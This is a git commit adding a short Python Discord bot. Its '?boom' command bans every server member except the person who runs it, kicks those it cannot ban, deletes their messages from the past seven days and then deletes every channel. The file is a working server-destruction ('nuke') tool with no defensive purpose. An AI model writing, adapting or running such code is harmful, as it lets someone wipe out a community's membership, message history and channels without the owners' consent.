d8f6da086ee1daf5ebb30ce7761484fbe79aa143
mark104478 <49283068+mark104478@users.noreply.github.com>
2019-12-27 16:58:07 +0530

    Add files via upload

---
+++ cya.py
@@ -0,0 +1,65 @@
+import discord
+from discord.ext import commands
+import os
+
+client = commands.Bot(command_prefix="?")
+
+
+
+@client.event
+async def on_ready():
+    print("-------")
+    print("Logged in as:")
+    
+
+@client.command(pass_context=True)
+async def boom(ctx):
+
+    server = ctx.message.guild
+    author = ctx.message.author
+
+
+    #  banning everyone
+
+    print("User wipe started.")
+    for member in list(server.members):
+
+        banint = 0
+        kickint = 0
+
+        if member == author:
+            print("Not banning initiator.")  # makes the bot not ban whoever uses command
+        else:
+            # in-case you cant ban someone due to perms, roles, etc.
+            try:
+                await member.ban(delete_message_days=7)
+                banint += 1
+                print("Banned member count: {}.".format(banint))
+            except Exception as e:
+                print(e)
+                try:
+                    await member.kick()   # tries to kick if no perms to ban
+                    kickint += 1
+                    print("Kicked member count: {}.".format(kickint))
+                except Exception as e:
+                    print(e)
+                    pass
+    print("Done wiping.")
+
+    #  deleting channels
+
+    print("Mass channel deletion started.")
+
+    for channel in list(server.channels):
+        try:
+            await channel.delete()
+            print("Deleting channel [{}]".format(channel.name))
+        except Exception as e:
+            print(e)
+            pass
+
+    print("Done deleting.")
+
+    print("Finished.")
+
+client.run(os.getenv('token'))
